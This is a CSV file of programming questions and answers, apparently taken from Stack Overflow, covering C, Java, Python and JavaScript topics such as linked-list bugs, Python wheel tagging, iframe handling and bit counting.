instruction,input,output,Categories
why do i get write access violation,"I get a write access violation when I debug the following code. In two lines, the exception is thrown, according to the debugger. These lines are commented as write access violation in the code below.
#include <stdio.h>

struct Lnode {
    int value;
    struct Lnode* next;
};

struct List {
    struct Lnode* head;
    struct Lnode* tail;
};

void listAdd(struct List* x, int val) {
    struct Lnode* y;
    y = (struct Lnode*)malloc(sizeof(struct Lnode)); // write access violation
    y->value = val; // write access violation

    if (x->head == NULL) {
        x->head = y;
        x->tail = y;
    }
    else {
        struct Lnode *currentNode;
        currentNode = x->head->next;
        while (currentNode) {
            if (currentNode->next == NULL) {
                currentNode->next = y;
                x->tail = y;
                break;
            }
            currentNode = currentNode->next;
        }
    }
}

struct Lnode* listFind(struct List* x, int value) {
    if (x->head->value == value) {
        return x->head;
    }
    else if (x->tail->value == value) {
        return x->tail;
    }
    else {
        struct Lnode* currentNode = x->head->next;
        while (currentNode) {
            if (currentNode->value == value) {
                return currentNode;
            }
            currentNode = currentNode->next;
        }
    }
    return NULL;
}

int main() {
    struct List* myList = (struct List*)malloc(sizeof(struct List));

    listAdd(myList, 10); 
    listAdd(myList, 20);
    printf(""%d"", listFind(myList, 10)->value);
    printf(""%d"", listFind(myList, 20)->value);
    return 0;
}

I am trying to use malloc to allocate memory for a struct. In this example I am trying to create a linked list. However, the exception is causing my program to fail.
","Here are the bugs that I see.  It is not necessarily a complete list.  I leave it to you to work out how to fix them.

You forgot #include <stdlib.h> to use malloc.  (You should get a lot of compiler warnings about that.)

After struct List* myList = malloc(...) the contents of *myList are uninitialized (garbage), but your program expects both its head and tail members to be NULL.  You have to set them explicitly.

In listAdd, if the list is empty, you add the new node to it, but its next member remains uninitialized, rather than being NULL as your program needs.  Again, you need to initialize it.

In listAdd, if the list contains exactly one node, then the next member of that node will be NULL, so setting currentNode = x->head->next;  results in currentNode = NULL.  This causes the while (currentNode) loop to terminate immediately without adding the new node.

You're missing \n at the end of your printf format strings, so the values printed will be run together, and your program outputs 1020 which I don't think is what you want.


And some general code review advice:

Your listFind as written won't work if passed an empty list.

Your listFind could be considerably simpler; the head and tail nodes do not need to be special cases, if you write it properly.

Should I cast the result of malloc (in C)? No.

listFind(myList, 10)->value is dangerous in general: if the value is not found, then listFind() returns NULL, and so dereferencing it (by applying the -> operator) would crash.  You should check the return value before dereferencing.  This is basic error checking practice.
I realize that in this case, if everything is working then the value will be found - but your code does not actually work yet.  As a result, after fixing bugs 1-3 above, bug 4, which by itself only results in incorrect list contents rather than a crash, still causes the program to crash because 20 is not found (because listAdd didn't insert it properly).  If you had proper error checking, the program could fail more gracefully, and would be easier to debug.

Likewise, as the other answer said, you should also check the return value of malloc, every time, and fail gracefully if it is NULL (out of memory).

One of the main reasons to have a tail pointer in a linked list is so that you can add a node at the end without needing to iterate through the entire list to locate the end.  Such an operation could be O(1), but in your code it is O(n), which is needlessly inefficient.


",c
how to populate author branch commit message in cypres dashboard in ci with jenkins,"I'm trying to get the commit information details in the Cypress Dashboard. I haven't been able to accomplish just yet, but I have made some advances though...
I'll describe what I have done so far:

Installed the commit-info npm package by running the command:

npm install --save @cypress/commit-info

Import the plugin in plugin/index.js file like so:

const { commitInfo } = require('@cypress/commit-info');

module.exports = on => {
  on('file:preprocessor', file => {
    commitInfo().then(console.log);
  });
};

Now I get all the information, author, branch, commit & message, in the terminal!:)
However, I still don't have the information details linked to my Cypress Dashboard.
This is what I currently get:

What're the next steps? The documentation is not clear to me...
","In our case we run everything inside a docker container.  We copy our code into the container but do not copy the .git directory, it's large, time consuming, and we don't need it.  @cypress/commit-info assumes there is a .git directory, so since there isn't, it doesn't work.
We overcame this by setting the values cypress expects explicitly in the cypress run command in our Jenkinsfile:
def commitMessage = sh(script:""git log --format=%B -n 1 ${env.GIT_COMMIT}"", returnStdout:true).trim()
def commitAuthor = sh(script:""git log --format='%an' -n 1 ${env.GIT_COMMIT}"", returnStdout:true).trim()
def commitEmail = sh(script:""git log --format='%ae' -n 1 ${env.GIT_COMMIT}"", returnStdout:true).trim()

def cypressVars = ""COMMIT_INFO_BRANCH=${env.GIT_BRANCH} COMMIT_INFO_SHA=${env.GIT_COMMIT} COMMIT_INFO_REMOTE=${env.GIT_URL} COMMIT_INFO_MESSAGE=\""${commitMessage}\"" COMMIT_INFO_AUTHOR=\""${commitAuthor}\"" COMMIT_INFO_EMAIL=${commitEmail}""

// call cypress however you do and include cypressVars as part of the command

",javascript
restrictions on non volatile variables in c,"I Would like to understand what Restrictions if any does the compiler have with regards to non volatile variables in C.
I'm not sure if its true or not, but I've been told that if you have the following code:
int x;
...
void update_x() {
  lock();
  x = x*5+3;
  unlock();
} 

You must acquire the lock to read x because even tough the compiler is unlikely to do it is technically legal for it to store intermediate calculation such as x*5 into x, and so the read might read an intermediate value. so my first question is whether it is indeed the case? if not, why not?
If it is, I have a followup question, is there anything that's prevents to compiler from using x as a temporary storage before or after taking the lock? (Assuming the compiler can prove that a single thread executing the program will not notice it).
If not, does that mean that any program that has non volatile shared variables is technically undefined even if all the accesses are protected by locks?
Thanks,
Ilya
","Prior to C11, the answer is No, as the spec doesn't define anything about what multiple threads do, so any program that uses multiple threads where one thread writes an object and another thread reads it is undefined behavior.
With C11, there's actually a memory model that talks about multiple threads and data races, so the answer is Yes, as long as the lock/unlock routines do certain synchronization operations (involving either library functions that do the synchronization or operations on special _Atomic objects).
Since the C11 spec is attempting to codify behavior of existing implementations (for the most part), it is likely that any code that does what it requires (ie, using a implementation provided library for locking, or implementation provided extensions for atomic operations) will work correctly even on pre-C11 implementations.
Section 5.2.1.4 of the C11 spec covers this.
",c
item in an object is undefined when called,"So I am trying to make a weather app, using openWeatherAPI, and I need the lattitude and longitude of a location
First off, the desired location (city) is put into the geocode class, so that it can be converted into an object with the city name, lon, and lat.
The thing is, when I use the lon and lat values, they appear as undefined, but when you call the whole object itself, it shows all the values as they should be.
This is my index.js:
import Search from ""./models/search"";
import GeoCode from ""./models/geocode"";

const geocode = new GeoCode(""toronto"");
const weather = new Search(geocode.lat, geocode.lon);

console.log(geocode);
console.log(weather);

This is my geocode converter API module (geocode.js):
import axios from ""axios"";

export default class Geocode{
    constructor(city){
        this.city = city;
        
        this.getLatLong();
    }

    async getLatLong(){
        try{
            const res = await axios(`https://us1.locationiq.com/v1/search.php?key=${key}&q=${this.city}&format=json`);

            this.lat = JSON.parse(res.data[0].lat);
            this.lon = JSON.parse(res.data[0].lon);
        }catch(err){
            console.log(err)
        }
    }
    
}

and this is my search module, where it contacts the api to search using lon and lat (search.js):
import axios from ""axios"";

export default class Search{
    constructor(lat, lon){
        this.lat = lat;
        this.lon = lon;

        this.getResults();
    }

    async getResults() {
        try {
            const res = await axios(`https://api.openweathermap.org/data/2.5/onecall?lat=${this.lat}&lon=${this.lon}&%20exclude=daily&appid=${key}&units=metric`);
            this.result = res;
        }catch(error){
            alert(error);
        }
    }
}

This is also what I get in the console:
Geocode {city: ""toronto""}

Search {lat: undefined, lon: undefined}

","Change this:
import Search from ""./models/search"";
import GeoCode from ""./models/geocode"";

const geocode = new GeoCode(""toronto"");
const weather = new Search(geocode.lat, geocode.lon);

console.log(geocode);
console.log(weather);

To this:
import Search from ""./models/search"";
import GeoCode from ""./models/geocode"";

(async () => {
  const geocode = new GeoCode(""toronto"");
  await geocode.getLatLong();

  const weather = new Search(geocode.lat, geocode.lon);
  await weather.getResults();

  console.log(geocode);
  console.log(weather);
})();

Also remove this.getLatLong(); from geocode.js, and remove this.getResults(); from search.js.
",javascript
how can i compile a library archive with a source code file with gcc,"TL;DR - I need to compile archive.a with test.o to make an executable.
Background - I am trying to call a function in a separate library from a software package I am modifying but the function (a string parser) is creating a segmentation violation. The failure is definitely happening in the library and the developer has asked for a test case where the error occurs. Rather than having him try to compile the rather large software package that I'm working on I'd rather just send him a simple program that calls the appropriate function (hopefully dying at the same place). His library makes use of several system libraries as well (lapack, cblas, etc.) so the linking needs to hit everything I think.
I can link to the .o files that are created when I make his library but of course they don't link to the appropriate system libraries.
This seems like it should be straight forward, but it's got me all flummoxed.
","The .a extension indicates that it is a static library. So in order to link against it you can use the switches for the linking stage:
gcc -o myprog -L<path to your library> main.o ... -larchive

Generally you use -L to add the path where libraries are stored (unless it is in the current directory) and you use -l<libname> to sepecify a library. The libraryname is without extension. If the library is named libarchive.a you would still give -larchive.
If you want to specify the full name of the library, then you would use i.e. -l:libname.a 
update
If the libraypath is /usr/lib/libmylibrary.a you would use
-L/usr/lib -lmylibrary

",c
quotcannot find symbol methodquot but the method is declared,"In my driver program, this line gives me cannot find symbol error and I don't know why. The method is clearly defined in the SavingsAccount class, and I can refer to all other methods in my driver program but just not that one, I tried changing the type to double, and etc but still not working.
Account acct2 = new SavingsAccount (name);
acct2.calculateBalance();

SavingsAccount class inherits from Account class:
public class SavingsAccount extends Account
{
    private final short minBalance = 0;
    private double overdraftFee;
    private double yearlyInterestRate = 0.02;
    private double interestAmount;

    public SavingsAccount (String name)
    {
        super(name);
    }

    public double withdraw (double amount)
    {
        if (accountBalance - amount >= minBalance)
        {
            accountBalance -= amount;
            System.out.print (""Withdraw Successful"");
        }
        else 
        {
            accountBalance -= amount;
            overdraftFee = accountBalance * (0.10);
            accountBalance += overdraftFee;
            System.out.print (""Withdraw Succesful, however overdraft fee of 10% has been applied to your account"");


        }

        return accountBalance;
    }

// ----------------- this is the method I try to invoke -----------------------------
    public void calculateBalance ()
    {
        interestAmount = (accountBalance * yearlyInterestRate);
        accountBalance += interestAmount;
    }
// ----------------------------------------------------------------------------------

    public String toString()
    {
        return super.toString() + "" Interest Received: "" + interestAmount;
    }


}

Account class, if needed
import java.util.Random;
import java.text.NumberFormat;

public abstract class Account
{
    protected double accountBalance;
    protected long accountNumber;
    protected String accountHolder;
    public Account (String name)
    {
        accountHolder = name;
        accountBalance = 0;
        Random accountNo = new Random();
        accountNumber  = accountNo.nextInt(100000);
    }

    public double deposit (double amount)
    {
        accountBalance += amount;

        return accountBalance;
    }

    public String toString()
    {
        NumberFormat accountBal = NumberFormat.getCurrencyInstance();
        return ""Account Balance: "" + accountBal.format(accountBalance) + ""\nAccount Number: "" + accountNumber;
    }

    public String getAccountHolder()
    {
        return accountHolder;
    }

    public double getAccountBalance()
    {
        return accountBalance;
    }

    public abstract double withdraw (double amount);

}

","Account acct2 = new SavingsAccount (name);
acct2.calculateBalance();

This is because although you have an object of SavingsAccount you are using refrence variable of type Account so you can access only those methods that are there in Account class.
And you don't have calculateBalance() method in your Account class. 
That's why you are not able to access it and compiler complains that it cannot find a method named calculateBalance  as it sees that reference type is Account and there is no such method inside Account class.
If you want to use that method then change reference type to SavingsAccount :
SavingsAccount acct2 = new SavingsAccount (name);

Or you can explicitly cast it when accessing that method
((SavingsAccount) acct2).calculateBalance();

but be alert that it can throw ClassCastException if acct2 object is actually not an object of SavingsAccount
UPDATE:
But
remember that at runtime, Java uses virtual method invocation to dynamically
select the actual version of the method that will run, based on the actual instance.
",java
how to build a stable abi wheel from the pep517 build package,"Context
I am currently developping a TreeSet/TreeMap package using an underlying C RedBlack tree library. I have developped a wrapper extension and in order to limit the number of binary wheels, I have used the stable ABI. To build the package distributions, I use build with a pyproject.toml configuration file, and setuptools as the backend.
Problem
The command python -m build (or pip install .) can only build a wheel tagged -cpxx-cpxx-platform (eg -cp38-cp38-linux_x86_64.whl on Linux or -0.1.0-cp310-cp310-win_amd64.whl on Windows). Using directly setuptools with a setup.py and a setup.config file, it is possible to build a wheel tagged as cpxx-abi3-platform with the command:
python setup.py bdist_wheel --py-limited-api=cpxx

but I could not find a way to pass the py-limited-api parameter to build
Current config for a simplified example
pyproject.toml
[build-system]
requires = [""setuptools>=60.0"", ""wheel""]
build-backend = ""setuptools.build_meta""

[project]
name = ""empty""
version = ""0.1.0""
authors = [
  { name=""SBA"", email=""s-ball@laposte.net"" },
]
description = ""Simple demo""
readme = ""README.md""
license = { file=""LICENSE.txt"" }
requires-python = "">=3.8""
classifiers = [
    ""Programming Language :: Python :: 3"",
    ""License :: OSI Approved :: MIT License"",
    ""Operating System :: OS Independent"",
    ""Development Status :: 3 - Alpha"",
    ""Intended Audience :: Developers"",
    ""Programming Language :: C"",
]

setup.py
from setuptools import setup, Extension
import os.path

kwargs = dict(
    # more metadata
    ext_modules=[
        Extension('empty.ext', [os.path.join('empty', 'ext.c')],
                  py_limited_api=True,
                  )]
)

setup(**kwargs)

ext.c
#define Py_LIMITED_API 0x03070000

#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <structmember.h>

// The module object
static PyObject* mod = NULL;

/*
 * Documentation for _rbtree.
 */
PyDoc_STRVAR(ext_doc, ""Minimal extension module"");

static PyObject *say_hello(PyObject *mod, PyObject *args) {
    return PyUnicode_FromString(""Hello !"");
}

PyMethodDef methods[] = {
    {""hello"", &say_hello, METH_NOARGS, PyDoc_STR(""Simple function"")},
    {NULL},
};

static PyModuleDef ext_def = {
    PyModuleDef_HEAD_INIT,
    ""ext"",
    ext_doc,
    -1,              /* m_size */
    .m_methods=methods,
};

PyMODINIT_FUNC PyInit_ext() {
    mod = PyModule_Create(&ext_def);
    return mod;
}

and an empty __init__.py file to declare a normal package.
Current research
I could not find anything about abi3 wheels anywhere in build documentation, nor in the Python Packaging User Guide where only version tagged build packaging are documented.
Workarounds

I could produce the expected wheels by manually unpacking a version tagged wheel (wheel unpack ...whl), changing its RECORD file, and packing it back (wheel pack ...)

Reverting to a good old python setup.py ... solution can directly build the correctly tagged wheel, but I am afraid that it is now legacy if not deprecated...


","It is damned simple! The key is that if parameters cannot be passed (at least not simply) in the command line, they can be declared in config files. So here a simple solution is to add a setup.cfg with a [build_wheel] section:
[bdist_wheel]
py_limited_api=cp37

That is enough for the module in charge of the creation of the wheel to find its parameter and correctly build wheel tagged with cp37-abi3-platform
",c
what39s the canonical way to check for type in python,"How do I check if an object is of a given type, or if it inherits from a given type?
How do I check if the object o is of type str?

Editor's note: Beginners often wrongly expect a string to already be ""a number"" – either expecting Python 3.x input to convert type, or expecting that a string like '1' is also simultaneously an integer. This question does not address those types of questions. Instead, see How do I check if a string represents a number (float or int)?, How can I read inputs as numbers? and/or Asking the user for input until they give a valid response as appropriate.
","Use isinstance to check if o is an instance of str or any subclass of str:
if isinstance(o, str):

To check if the type of o is exactly str, excluding subclasses of str:
if type(o) is str:

See Built-in Functions in the Python Library Reference for relevant information.

Checking for strings in Python 2
For Python 2, this is a better way to check if o is a string:
if isinstance(o, basestring):

because this will also catch Unicode strings. unicode is not a subclass of str; both str and unicode are subclasses of basestring. In Python 3, basestring no longer exists since there's a strict separation of strings (str) and binary data (bytes).
Alternatively, isinstance accepts a tuple of classes. This will return True if o is an instance of any subclass of any of (str, unicode):
if isinstance(o, (str, unicode)):

",python
msgraph java sdk retrieve wellknow folder,"Previously with the V5 of the Microsoft Java SDK for MSGraph, to retrieve the inbox folder by it's ""well known name"", I was doing the following:
return graphClient.users(""my-email@mail.com"")
                .mailFolders(""inbox"") // hardcoded well know name in place of id
                .messages()
                .get();

But since the V6 update, I can't find anything in the help pages nor the SDK on how to achieve the same.
It looks like there is a class WellKnownFolderName in the SDK but I can't figure out how to use it.
I tried some things like
var folderId = new FolderId(WellKnownFolderName.Inbox).getUniqueId();
var inboxFolder = graphClient.me().mailFolders().byMailFolderId(folderId).get();

But folderId id is null
","You can specify the well-know name in byMailFolderId()
MailFolder result = graphClient.me().mailFolders().byMailFolderId(""inbox"").get();

",java
kotlin  lack of treemap,"Why there are no TreeMap in Kotlin ?
I know we can use the TreeMap using java utils, but this is probably not the real reason.
Do we can achieve the same using HashMap ?
","A TreeMap is different from a HashMap because it has a specific order when iterating through the elements.  The items in it will be sorted according to their natural ordering or according to whatever comparator it was built with. If you iterate over a HashMap the order of the elements will be essentially random.  In Java TreeMap is a specific type of SortedMap.
Kotlin provides similar functionality when running on the JVM. Map has a toSortedMap function which returns a sorted version of itself.  The implementation actually uses a TreeMap under the hood.  This function is missing on other Kotlin platforms, possibly because there was no corresponding TreeMap implementation available on them.
See the documentation here: https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.collections/to-sorted-map.html
",java
how can i have multiple left axisitems with the same alignmentposition using pyqtgraph,"I wonder if someone can help me out. I am trying to convert the MultiplePlotAxes.py example in pyqtgraph so that the all the axes are on the right side and aligned. Here is my code which I have added an extra plot:
""""""
Demonstrates a way to put multiple axes around a single plot.
(This will eventually become a built-in feature of PlotItem)
""""""
#import initExample  ## Add path to library (just for examples; you do not need this)

import pyqtgraph as pg
from pyqtgraph.Qt import QtCore, QtGui
import numpy as np

pg.mkQApp()

pw = pg.PlotWidget()
pw.show()
pw.setWindowTitle('pyqtgraph example: MultiplePlotAxes')
p1 = pw.plotItem
p1.setLabels(left='axis 1')

## create a new ViewBox, link the right axis to its coordinate system
p2 = pg.ViewBox()
p1.showAxis('right')
p1.scene().addItem(p2)
p1.getAxis('right').linkToView(p2)
p2.setXLink(p1)
p1.getAxis('right').setLabel('axis2', color='#0000ff')

## create third ViewBox.
## this time we need to create a new axis as well.
p3 = pg.ViewBox()
ax3 = pg.AxisItem('right')
p1.layout.addItem(ax3, 2, 3)
p1.scene().addItem(p3)
ax3.linkToView(p3)
p3.setXLink(p1)
ax3.setZValue(-10000)
ax3.setLabel('axis 3', color='#ff0000')

## create forth ViewBox.
## this time we need to create a new axis as well.
p4 = pg.ViewBox()
ax4 = pg.AxisItem('right')
p1.layout.addItem(ax4, 2, 4)
p1.scene().addItem(p4)
ax4.linkToView(p4)
p4.setXLink(p1)
ax4.setZValue(-10000)
ax4.setLabel('axis 4', color='#2EFEF7')

## Handle view resizing
def updateViews():
    ## view has resized; update auxiliary views to match
    global p1, p2, p3, p4
    p2.setGeometry(p1.vb.sceneBoundingRect())
    p3.setGeometry(p1.vb.sceneBoundingRect())
    p4.setGeometry(p1.vb.sceneBoundingRect())

    ## need to re-update linked axes since this was called
    ## incorrectly while views had different shapes.
    ## (probably this should be handled in ViewBox.resizeEvent)
    p2.linkedViewChanged(p1.vb, p2.XAxis)
    p3.linkedViewChanged(p1.vb, p3.XAxis)
    p4.linkedViewChanged(p1.vb, p4.XAxis)

updateViews()
p1.vb.sigResized.connect(updateViews)

p1.plot([1, 2, 4, 8, 16, 32])
p2.addItem(pg.PlotCurveItem([1, 2, 4, 9, 16, 32], pen='b'))
p3.addItem(pg.PlotCurveItem([1, 2, 4, 7, 16, 32], pen='r'))
p4.addItem(pg.PlotCurveItem([1, 3, 5, 7, 17, 32], pen='c'))

## Start Qt event loop unless running in interactive mode or using pyside.
if __name__ == '__main__':
    import sys

    if (sys.flags.interactive != 1) or not hasattr(QtCore, 'PYQT_VERSION'):
        QtGui.QApplication.instance().exec_()

This produces the following picture which I have added a red arrow showing what I want to do. 

Based on what I have been able to figure out I can do this using pg.GraphicsLayout(). However, the axisItem directly associated with plotItem and the created axisItems don't match because the one attached to the plotitem is smaller.
Here is a picture of what I believe is happening:

This is my problem as I want them to all align. In the attached code you can addItem(axes,2,1) to the right but it doesn't work on the left. Anyone know how I can do this?
Thanks in advance for any help you can provide.
","I had this same issue, saw this post, was disappointed with the lack of an answer, but I finally did manage a fix so figured I would post here.
If you could post the code you have for the axis on the right, I could patch that up, but basically what I did was attach the bottom axis to a a row of its own.
self.main_pI = pg.PlotItem()
self.axis_bottom = self.main_pI.getAxis('bottom')
self.axis_bottom.setLabel('Time (seconds)', color='#ffffff')
self.layout.addItem(self.main_pI, row=1, col=2, rowspan=2)
self.layout.addItem(self.axis_bottom, row=3, col=2, rowspan=2)

I'm a noob at pyqtgraph so I'm sure I'm going to butcher this terminology, but I detach the 'bottom' axis, and reattach it to the layout, where it's on a row of its own.
Hope that helps.
",python
how to move an iframe in the dom without losing its state,"Take a look at this simple HTML:
<div id=""wrap1"">
  <iframe id=""iframe1""></iframe>
</div>
<div id=""warp2"">
  <iframe id=""iframe2""></iframe>
</div>

Let's say I wanted to move the wraps so that the #wrap2 would be before the #wrap1. The iframes are polluted by JavaScript. I am aware of jQuery's .insertAfter() and .insertBefore(). However, when I use those, the iFrame loses all of its HTML, and JavaScript variables and events.
Lets say the following was the iFrame's HTML:
<html>
  <head>
    <script type=""text/javascript"" src=""jquery.js""></script>
    <script type=""text/javascript"">
      // The variable below would change on click
      // This represents changes on variables after the code is loaded
      // These changes should remain after the iFrame is moved
      variableThatChanges = false;
      $(function(){
        $(""body"").click(function(){ 
          variableThatChanges = true; 
        });
      });
    </script>
  </head>
  <body>
    <div id='anything'>Illustrative Example</div>
  </body>
</html>

In the above code, the variable variableThatChanges would...change if the user clicked on the body. This variable, and the click event, should remain after the iFrame is moved (along with any other variables/events that have been started)
My question is the following: with JavaScript (with or without jQuery), how can I move the wrap nodes in the DOM (and their iframe childs) so that the iFrame's window stays the same, and the iFrame's events/variables/etc stay the same?
","It isn't possible to move an iframe from one place in the dom to another without it reloading. 
Here is an example to show that even using native JavaScript the iFrames still reload:
http://jsfiddle.net/pZ23B/
var wrap1 = document.getElementById('wrap1');
var wrap2 = document.getElementById('wrap2');
setTimeout(function(){
    document.getElementsByTagName('body')[0].appendChild(wrap1);
},10000);

",javascript
cuda compiler error no input files specified,"Trying to compile in win7 x64 cmd prompt. The following command:
nvcc -o kernal.cu

yields the following error message.
nvcc : fatal error : No input files specified; use option --help for more information

","try

nvcc -o xxx kernal.cu

where xxx is the output file name you want.
",c
embed javascript as base64,"I'm working on a small GreaseMonkey script where I would like to embed a jQuery plugin (Markitup) so that the script is fully self contained (images + js) except for jQuery which is served from google.
I found the site http://www.greywyvern.com/code/php/binary2base64 which says that you can embed javascript with the href if you base64 encode the script, much like serving images as basse64 from CSS.
<script type=""text/javascript"" href=""data:text/javascript;base64,dmFyIHNjT2JqMSA9IG5ldyBzY3Jv...""></script>

So i tried that but couldn't get it to work at all, using Firefox 3.0.5 on OS X.
I put together a small test page to isolate the problem but couldn't get it to work at that page either.
<!DOCTYPE HTML>
<html>
   <head>
      <title>Title</title>
      <meta charset=""utf-8"">
   </head>
   <body>
      <script href=""data:text/javascript;base64,YWxlcnQoJ2FzYWRhc2QnKTsK""></script> 
      <script>alert('a');</script>  
   </body>
</html>

The base64 string (YWxlcnQoJ2FzYWRhc2QnKTsK) says alert('asadasd'); so I'm supposed to get two alerts but the only one I see is the second one where the alert is located as text inside the script tag.
Am I doing something wrong or why isn't this working, any ideas?
","maybe just a thought but maybe the ""href"" should be ""src"" instead.
",javascript
how to listen iframe keydown event with reactjs,"I want to listen for a keydown event of an iframe in reactjs. In my iframe i have video embedded. Now when the video is playing i want to handle keyboard events.Can any one please help me how to listen for keyboard events. This is my code
class VideoDetail extends Component {

videoLoad(e) {
    console.log('videoLoaded');
    this.videoFrame.addEventListener('keydown',this.onVideoDown);
}

onVideoDown(e) {
    console.log('key pressed'); // This is not invoking
}

componentDidMount() {
    console.log(this.videoFrame);
}
render() {
    const video = this.props.video;
    if (!video) {
        return <div>Loading...</div>;
    }

    const videoId = video.id.videoId;
    const url = `https://www.youtube.com/embed/${videoId}`;
    return (
        <div className=""video-detail col-md-8"">
            <div className=""embed-responsive embed-responsive-16by9"">
                <iframe ref={(iframe) => { this.videoFrame = iframe; console.log(iframe); }} className=""embed-responsive-item"" src={url} onLoad={(e) => this.videoLoad(e)}></iframe>
            </div>
            <div className=""details"">
                <div>{video.snippet.title}</div>
                <div>{video.snippet.description}</div>
            </div>
        </div>
    );
}

}

","You can catch the iframe keydown event with iframe.contentWindow.document as below using either e.target or this.videoFrame with the ref.
Modified code
videoLoad(e) {
    console.log('videoLoaded');
    var iframe = e.target; // it is equal to ""this.videoFrame"" and so, you can avoid using ""ref""
    //this.videoFrame.addEventListener('keydown',this.onVideoDown);
    iframe.contentWindow.document.addEventListener('keydown', this.onVideoDown);
}

",javascript
count bits 1 on an integer as fast as gcc __builtin__popcountint,"I write a algorithm (taken from ""The C Programming Language"") that counts the number of 1-bits very fast:
int countBit1Fast(int n)
{
    int c = 0;
    for (; n; ++c)
        n &= n - 1;
    return c;
}

But a friend told me that __builtin__popcount(int) is a lot faster, but less portable. I give it a try and was MANY times faster! Why it's so fast? I want to count bits as fast as possible, but without stick to a particular compiler.
EDIT: I may use it on PIC micro-controllers and maybe on non-intel processors, so I need the maximum portability. 
","
I write a algorithm (taken from ""The C Programming Language"") that counts the number of 1-bits very fast:

I don't see why anyone would characterize your approach as ""very fast"".  It's a bit clever, and it should be faster on average than naive alternatives.  It also does not depend on the width of the representation of int, which is a plus.  I observe that it has undefined behavior for negative arguments, but that's a common theme for bitwise operators and functions.
Let's analyze, supposing a non-negative argument:
int c = 0;
for (; n; ++c)
    n &= n - 1;


How many loop iterations are performed?
1 for each 1 bit in the binary representation of the value, irrespective of where in the value each bit lies

How much work is performed per iteration

one increment of c
one comparison of n against zero (plus one more of these when breaking out of the loop)
one decrement of n by 1
one bitwise 'and'

That ignores reads and stores, which very likely can be made free or especially cheap by keeping the operands in registers.  If we assume equal cost for each of those, that's four operations per iteration.  For random 32-bit integers, there will be an average of 16 iterations, for a total of 65 operations on average.  (Best case is just one operation, but worst is 129, which is no better than a naive implementation).


__builtin_popcount(), on the other hand, uses a single instruction regardless of input on platforms that support it, such as yours very likely is.  Even on those that don't have a for-purpose instruction, however, it can be done faster (on average).
@dbush has presented one such mechanism that has similar advantages to the one you present.  In particular, it does not depend on a pre-chosen integer width, and although it does depend on where in the representation the 1 bits reside, it does run faster for some arguments (smaller ones) than others.  If I'm counting right, that one will average around 20 operations on random 32-bit inputs: five in each of four loop iterations (only 0.4% of random inputs would require fewer than four iterations).  I'm counting one table read per iteration there, which I assume can be served from cache, but which is probably still not as fast as an arithmetic operation on values already held in registers.
One that is strictly computational would be:
int countBit1Fast(uint32_t n) {
    n = (n & 0x55555555u) + ((n >> 1) & 0x55555555u);
    n = (n & 0x33333333u) + ((n >> 2) & 0x33333333u);
    n = (n & 0x0f0f0f0fu) + ((n >> 4) & 0x0f0f0f0fu);
    n = (n & 0x00ff00ffu) + ((n >> 8) & 0x00ff00ffu);
    n = (n & 0x0000ffffu) + ((n >>16) & 0x0000ffffu);
    return n;
}

That's pretty easy to count: five additions, five shifts, and ten bitwise 'and' operations, and 5 loads of constants for a total of 25 operations for every input (and it goes up only to 30 for 64-bit inputs, though those are now 64-bit operations instead of 32-bit ones).  This version is, however, intrinsically dependent on a particular size of the input data type.
",c
nodejs spawn vs execute,"In an online training video I am watching to learn Node, the narrator says that ""spawn is better for longer processes involving large amounts of data, whereas execute is better for short bits of data.""
Why is this? What is the difference between the child_process spawn and execute functions in Node.js, and when do I know which one to use?
","The main difference is that spawn is more suitable for long-running processes with huge output. That's because spawn streams input/output with a child process. On the other hand, exec buffers output in a small (by default 1MB, 200 KB till v11.x) buffer. exec first spawns a subshell, and then tries to execute your process. To cut a long story short, use spawn in case you need a lot of data streamed from a child process and exec if you need features like shell pipes, redirects or even more than one program at a time.
Some useful links - DZone Hacksparrow
",javascript
